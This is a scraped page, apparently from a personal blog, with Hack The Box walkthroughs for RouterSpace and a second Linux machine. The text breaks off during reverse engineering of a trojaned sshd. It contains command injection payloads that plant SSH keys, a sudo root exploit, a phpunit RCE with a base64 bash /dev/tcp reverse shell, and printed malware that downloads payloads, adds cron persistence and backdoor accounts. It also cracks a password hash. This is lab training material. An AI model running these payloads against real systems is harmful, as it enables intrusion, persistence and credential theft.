Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\"652c-17d476c9285\" | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\"no-js\" lang=\"zxx\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\"utf-8\"\u0026gt; | \u0026lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\"description\" content=\"\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/magnific-popup.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/themify-icons.css\"\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-62870 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\" | Date: | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close |_http-title: RouterSpace |_http-trane-info: Problem with XML parsing of /evox/about Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.17 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nAnalyzing an APK file If we go to http://10.10.11.148, we will see a landing page like this one:\nHere we can download an APK file containing an Android mobile app to connect to a router.\n$ grep -ia routerspace RouterSpace.apk (R, R) Remove %1$sReport RouterSpaceSave routerspace.htb10U routerspace10U routerspace.htb10U routerspace10U  This tells that routerspace.htb is a domain that we need to introduce in /etc/hosts.\nAt this point, we might want to use MobSF to analyze the APK file, because it provides both static and dynamic analysis (using Genymotion). Once everything is set up, we can start MobSF:\nThen we upload the APK file and let the analysis run:\nStatic code analysis of the Java source files won\u0026rsquo;t be useful, since the APK is generated by React Native. Hence, let\u0026rsquo;s start a dynamic analysis:\nMobSF is so good that it allows to see the Android app from the browser:\nIf we click on \u0026ldquo;Check Status\u0026rdquo;, we will see an error:\nInspecting HTTP traffic At this point, I tried to set up an HTTP proxy in MobSF, but I found it easier to configure anbox and Burp Suite. These are all the needed commands:\n$ anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity Activity  $ adb kill-server $ adb start-server * daemon not running; starting now at tcp:5037 * daemon started successfully $ adb devices List of devices attached emulator-5558 device $ adb connect 127.0.0.1:5037 connected to 127.0.0.1:5037 $ adb install RouterSpace.apk Success  $ ifconfig anbox0 anbox0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.250.1 netmask 255.255.255.0 broadcast 0.0.0.0 inet6 fe80::8f7:50ff:fe42:beb3 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether fe:f0:c2:f7:31:3b txqueuelen 1000 (Ethernet) RX packets 28 bytes 2420 (2.4 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 79 bytes 15733 (15.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0  $ adb shell settings put global http_proxy 192.168.250.1:8080  Now, if we click on \u0026ldquo;Check Status\u0026rdquo;, we will see the web request in Burp Suite:\nAnd this is the response:\nWe can replicate the same request using curl:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -d '{\"ip\":\"0.0.0.0\"}' Suspicious activity detected !!! {RequestID: 0 O3XJ g K MJ E I Jw }  But we need to put User-Agent: RouterSpaceAgent to mimic the APK, so that we don\u0026rsquo;t get caught:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"0.0.0.0\"}' \"0.0.0.0\\n\"  Exploiting a command injection Notice that the response echoes the value in ip:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"0.0.0.0x\"}' \"0.0.0.0x\\n\" $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"asdf\"}' \"asdf\\n\"  Let\u0026rsquo;s try to inject a shell command:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`whoami`\"}' \"paul\\n\"  It is vulnerable to command injection. Let\u0026rsquo;s read the user.txt flag:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`cat /home/paul/user.txt`\"}' \"3186ef30c6d390192314aa7bf355068c\\n\"  Access to the machine If we try to execute a reverse shell, we won\u0026rsquo;t be able to obtain it because of some iptables rules. However, we can enter a public SSH key into /home/paul/.ssh/authorized_keys and connect via SSH as paul:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`ls -la --time-style=+ /home/paul/.ssh/`\"}' \"total 8 drwx------ 2 paul paul 4096 . drwxr-xr-x 8 paul paul 4096 ..\\n\"  $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsa Your public key has been saved in id_rsa.pub The key fingerprint is: SHA256:tWK5MX2wtzjqjNUfjWNK0dvzcluD/UwRbr618J8mUQg The key's randomart image is: +---[RSA 3072]----+ | | | E | | o . .. | | + = ....| | S = + .+ | | . * = B= .| | o = Bo=++| | + o = ++*X| | ..+ . . oOB| +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDvVJzNh61shoVPa4wfxz/GjAc5CJ2+IznWzjixGWOpbScP3ZOmGfiJ711e0WoGtEnTRVwZzDiz6dmXElC/vSNz0JyQ4BXGOor3XMXcoF+jBmBAmVdzuyKJJPtqu11BO9QvzS6lR5U0iMQR6CFE1tkHiMsnRr55aljUqnnLyO0ANfsTEOu1fkHDO+4GFwESUYrbLX+dbdff2MOGmx6ZqATM2D8D/I4LJ8KvPraeRA3b9BxX3ymduhGwrcDFhcA2f77814ZZUUpFZyVIVA9DOHZHm2ZOVY15QXA9SMLM7K8HkHhLNljEjc13zDfWGWD9nO4QKVe+RUuLgq9K6Y183e14JVU55R0y4LnkR7pSHc5P02PYkJKB3oVESwNjxShOmTdnAFIRCm8dVCSODaAMR/jwdCAYBNlZKwiT7BROQpU3IntUUW87nQKyzTOXaMbgYgVq8X43G5fItL5eT83WcSITsVTHD1MX69x3+bgSLKEf9xSfY$DLc2OYJb9pK7AVcLk= $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDvVJzNh61shoVPa4wfxz/GjAc5CJ2+IznWzjixGWOpbScP3ZOmGfiJ711e0WoGtEnTRVwZzDiz6dmXElC/vSNz0JyQ4BXGOor3XMXcoF+jBmBAmVdzuyKJJPtqu11BO9QvzS6lR5U0iMQR6CFE1tkHiMsnRr55aljUqnnLyO0ANfsTEOu1fkHDO+4GFwESUYrbLX+dbdff2MOGmx6ZqATM2D8D/I4LJ8KvPraeRA3b9BxX3ymduhGwrcDFhcA2f77814ZZUUpFZyVIVA9DOHZHm2ZOVY15QXA9SMLM7K8HkHhLNljEjc13zDfWGWD9nO4QKVe+RUuLgq9K6Y183e14JVU55R0y4LnkR7pSHc5P02PYkJKB3oVESwNjxShOmTdnAFIRCm8dVCSODaAMR/jwdCAYBNlZKwiT7BROQpU3IntUUW87nQKyzTOXaMbgYgVq8X43G5fItL5eT83WcSITsVTHD1MX69x3+bgSLKEf9xSfYnDLc2OYJb9pK7AVcLk= \u0026gt;\u0026gt; /home/paul/.ssh/authorized_keys`\"}' \"\\n\" $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`ls -la /home/paul/.ssh/`\"}' \"total 12 drwx------ 2 paul paul 4096 . drwxr-xr-x 8 paul paul 4096 .. -rw-r--r-- 1 paul paul 553 authorized_keys\\n\"  Alright, now we have access as paul:\n$ ssh -i id_rsa paul@10.10.11.148 paul@routerspace:~$  Privilege escalation with sudo If we run linpeas.sh, we will see that the version of sudo is vulnerable:\n$ scp -i id_rsa linpeas.sh paul@10.10.11.148:/tmp linpeas.sh 100% 746KB 713.4KB/s 00:01  paul@routerspace:~$ cd /tmp paul@routerspace:/tmp$ bash linpeas.sh ... ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.31 ...  Indeed, sudo version 1.8.31 is vulnerable to CVE-2021-3156:\npaul@routerspace:~$ sudo -V Sudo version 1.8.31 Sudoers policy plugin version 1.8.31 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.31  I will be compiling this exploit: Sudo-1.8.31-Root-Exploit. Fortunately, we have gcc installed in the machine:\npaul@routerspace:~$ which gcc /usr/bin/gcc  So, let\u0026rsquo;s compress the sources and transfer them to the remote machine:\n$ tar -czf exploit.tar.gz exploit.c Makefile shellcode.c $ scp -i id_rsa exploit.tar.gz paul@10.10.11.148:/tmp exploit.tar.gz 100% 1324 14.5KB/s 00:00  Now, we uncompress the archive, compile the exploit and run it to get a shell as root:\npaul@routerspace:/tmp$ tar xvfz exploit.tar.gz exploit.c Makefile shellcode.c paul@routerspace:/tmp$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:/tmp$ ./exploit # cat /root/root.txt b8c6654274a29e9cc18cb6297d1c166e  ","image":"/images/HTB/RouterSpace/RouterSpace.png","permalink":"https://7rocky.github.io/en/htb/routerspace/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a downloadable APK file with a simple app. This app performs a web request to an API the needs th be captured with a proxy, and this API is vulnerable to a command injection. After that, we can access to the machine via SSH and basic enumeration shows that the version of sudo is vulnerable","time":6,"title":"RouterSpace"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.146   Release: 19 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.146 -p 22,80 Nmap scan report for 10.10.11.146 Host is up (0.034s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Diana's Jewelry Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.22 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.146 we will see a website like this:\nIf we click on \u0026ldquo;VISIT STORE\u0026rdquo;, we will be redirected to http://store.djewelry.htb. After setting the subdomain in /etc/hosts we will see the following website:\nBut nothing interesting at all. Let\u0026rsquo;s fuzz to enumerate some routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://store.djewelry.htb/FUZZ images [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 93ms] css [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 129ms] js [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 225ms] vendor [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 126ms] fonts [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 108ms] [Status: 200, Size: 6215, Words: 528, Lines: 196, Duration: 184ms] server-status [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 94ms]  There is a /vendor route:\nThis directory shows the dependencies of the web project. There is a vulnerability for phpunit that leads to Remote Code Execution (RCE). It is shown in blog.ovhcloud.com (CVE-2017-9841) and we can eploit it using a simple curl command:\n$ curl -d '\u0026lt;?php system(\"whoami\");' store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php www-data  Foothold on the machine Nice, let\u0026rsquo;s get a reverse shell on the machine using a Bash command encoded in Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  $ curl -d '\u0026lt;?php system(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\");' store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:46572. bash: cannot set terminal process group (934): Inappropriate ioctl for device bash: no job control in this shell www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd / cd / www-data@production:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@production:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@production:/$ export TERM=xterm www-data@production:/$ export SHELL=bash www-data@production:/$ stty rows 50 columns 158  System enumeration The first thing we notice is that there is one user called steven:\nwww-data@production:/$ ls /home steven  Unexpectedly, there is a user called steven1 in /etc/passwd, and with the same user ID (1000):\nwww-data@production:/$ grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash steven1:x:1000:1000:,,,:/home/steven:/bin/bash  This is really strange, isn\u0026rsquo;t it? Let\u0026rsquo;s check what files we can access as www-data:\nwww-data@production:/$ find / -user www-data -type f 2\u0026gt;/dev/null | grep -vE 'proc|www' /var/backups/info  We have /var/backups/info:\nwww-data@production:/$ ls -l /var/backups/info -r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info  We are able to read an execute this file. It is a 64-bit ELF:\nwww-data@production:/$ file /var/backups/info /var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped  If we execute the binary file, we see it is a kernel exploit, but seems not to work:\nwww-data@production:/$ /var/backups/info [.] starting [.] namespace sandbox set up [.] KASLR bypass enabled, getting kernel addr [-] substring 'ffff' not found in dmesg  We can start thinking that the machine is already comprimised.\nSince strings is not installed on the machine, let\u0026rsquo;s transfer the binary to our machine using nc:\nwww-data@production:/$ nc 10.10.14.62 4444 \u0026lt; /var/backups/info ^C www-data@production:/$ md5sum /var/backups/info 04060ea986c7bacdc64130a1d7b8ca2d /var/backups/info  $ nc -nlvp 4444 \u0026gt; info Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:40972. $ md5sum info 04060ea986c7bacdc64130a1d7b8ca2d info  Having checked the integrity of the file, we can run strings on it and obtain a large string:\n$ strings -100 info 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b  This seems to be encoded in hexadecimal digits (there are only numbers and letters from a to f). Let\u0026rsquo;s decode it using xxd:\n$ strings -100 info | xxd -r -p wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" \u0026gt;\u0026gt; /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u0026gt;= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u0026gt;= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u0026gt; users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" \u0026gt;\u0026gt; /etc/passwd; done \u0026lt; users.txt; rm users.txt;  It is a \u0026ldquo;one-liner\u0026rdquo; shell command. If we break it into pieces, we have this:\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys wget tempfiles.xyz/.main -O /var/lib/.main chmod 755 /var/lib/.main echo \"* 3 * * * root /var/lib/.main\" \u0026gt;\u0026gt; /etc/crontab awk -F\":\" '$7 == \"/bin/bash\" \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\")}' /etc/passwd awk -F\":\" '$7 == \"/bin/bash\" \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u0026gt; users.txt\")}' /etc/passwd while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" \u0026gt;\u0026gt; /etc/passwd done \u0026lt; users.txt rm users.txt  First it is downloading a file called .main, storing it in /var/lib/.main and setting it to run every minute between 03:00 and 03:59 (that\u0026rsquo;s what * 3 * * * means, check it out using crontab.cronhub.io). Although /etc/crontab has this configuration set:\nwww-data@production:/$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) # * 3 * * * root /var/lib/.main  The file /var/lib/.main does not exist:\nsteven@production:~$ ls -l /var/lib/.main ls: cannot access '/var/lib/.main': No such file or directory  Lateral movement to steven Hence, let\u0026rsquo;s continue with the \u0026ldquo;one-liner\u0026rdquo; command. Next, it adds a hashed password into /etc/passwd seting the username to \u0026quot;$user\u0026quot;1. It\u0026rsquo;s clear that this refers to steven1. Let\u0026rsquo;s crack the hashed password with john:\n$ echo \"steven1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::\" \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status ihatehackers (steven1) 1g 0:00:01:32 DONE 0.01078g/s 961.2p/s 961.2c/s 961.2C/s iloveyoudaddy..halo03 Use the \"--show\" option to display all of the cracked passwords reliably Session completed.  With this password, we can login as steven1 using SSH:\n$ ssh steven1@10.10.11.146 steven1@10.10.11.146's password: steven@production:~$ id uid=1000(steven) gid=1000(steven) groups=1000(steven) steven@production:~$ cat user.txt 61bbcee605d3d4f5a4deef36b75c8126  Surprisingly, we are steven (not steven1). This happens because both users have the same user ID. Now that we have the user.txt flag, let\u0026rsquo;s continue enumerating.\nApache service enumeration This user has an email at /var/mail/steven:\nsteven@production:~$ find / -user steven 2\u0026gt;/dev/null | grep -vE 'proc|sys|run' /dev/pts/0 /var/mail/steven /home/steven /home/steven/.cache /home/steven/.cache/motd.legal-displayed /home/steven/.bashrc /home/steven/user.txt /home/steven/.profile /home/steven/.local /home/steven/.local/share /home/steven/.local/share/nano /home/steven/.ssh /home/steven/.bash_logout /home/steven/.bash_history steven@production:~$ cat /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: \u0026lt;root@production\u0026gt; Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for \u0026lt;steven@production\u0026gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u0026lt;202107251031.80FAcdZ171847@production\u0026gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behavior with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin  It says that Apache is behaving in a strange way. Maybe the binary file /var/backups/info has something to do. Let\u0026rsquo;s take the date of last modification of this file:\nsteven@production:~$ ls -l /var/backups/info -r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info  Now we can search for files from Apache around that date, maybe we are right and the server is already comprimised:\nsteven@production:~$ find / -newermt '2021-05-10' ! -newermt '2021-05-20' 2\u0026gt;/dev/null | grep apache /usr/lib/apache2/modules/mod_reader.so /etc/apache2/mods-available/reader.load /etc/apache2/mods-enabled/reader.load  Following these files, we end up with another 64-bit ELF:\nsteven@production:~$ file /etc/apache2/mods-enabled/reader.load /etc/apache2/mods-enabled/reader.load: symbolic link to ../mods-available/reader.load steven@production:~$ file /etc/apache2/mods-available/reader.load /etc/apache2/mods-available/reader.load: ASCII text steven@production:~$ cat /etc/apache2/mods-enabled/reader.load LoadModule reader_module /usr/lib/apache2/modules/mod_reader.so steven@production:~$ file /usr/lib/apache2/modules/mod_reader.so /usr/lib/apache2/modules/mod_reader.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=e26fdc45e4b6561d29af8306c2be74f35ab140bb, with debug_info, not stripped  This is a module loaded into Apache (maybe a backdoor). Again, let\u0026rsquo;s transfer it to our machine using nc:\nsteven@production:~$ nc 10.10.14.62 4444 \u0026lt; /usr/lib/apache2/modules/mod_reader.so ^C steven@production:~$ md5sum /usr/lib/apache2/modules/mod_reader.so 5ef63371b6a138253a87aa1f79abf199 /usr/lib/apache2/modules/mod_reader.so  $ nc -nlvp 4444 \u0026gt; mod_reader.so Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:44820. $ md5sum mod_reader.so 5ef63371b6a138253a87aa1f79abf199 mod_reader.so  Running strings in the binary results in another long string. This time it seems to be encoded in Base64 because we have numbers and letters (both uppercase and lowercase):\n$ strings -120 mod_reader.so d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk $ strings -120 mod_reader.so | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd  There is another \u0026ldquo;one-liner\u0026rdquo;, though this time is simpler:\nwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd  This time, it is downloading a file called image.jpeg and overwriting /usr/sbin/sshd (obviously, it is not a JPEG image). After that, it modifies the date of /usr/sbin/sshd to keep undetected.\nNice, so let\u0026rsquo;s transfer /usr/sbin/sshd to our machine to analyze it:\nsteven@production:~$ nc 10.10.14.62 4444 \u0026lt; /usr/sbin/sshd ^C steven@production:~$ md5sum /usr/sbin/sshd 9ae629656c6f72dc957358b1f41df27e /usr/sbin/sshd  $ nc -nlvp 4444  sshd Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:44820. ^C $ md5sum sshd 9ae629656c6f72dc957358b1f41df27e sshd  Analyzing sshd (reverse engineering) We can open the file in Ghidra and look at the functions. Since it is a program that runs as daemon (that\u0026rsquo;s the meaning of the d in sshd), this program exports some functions that will be used by other programs such as ssh.\nHence, we must look for exported functions. One of them is auth_password, which smells because we see a variable called backdoor (the binary is not stripped):\nint auth_password(ssh *ssh, char *password) { Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor[31]; byte local_39[9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *) ssh-\u0026gt;authctxt; local_30 = *(long *) (in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *) backdoor; while(true) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; if (pbVar5 == local_39) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(password, backdoor); uVar3 = 1; if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 \u0026lt; 0x401) { if ((ppVar1-\u0026gt;pw_uid == 0) \u0026amp;\u0026amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != '\\0') || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-\u0026gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh, password); if (ctxt-\u0026gt;force_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint) (iVar2 != 0 \u0026amp;\u0026amp; iVar8 != 0); } } } if (local_30 == *(long *) (in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); }  Although Ghidra does something weird with backdoor, 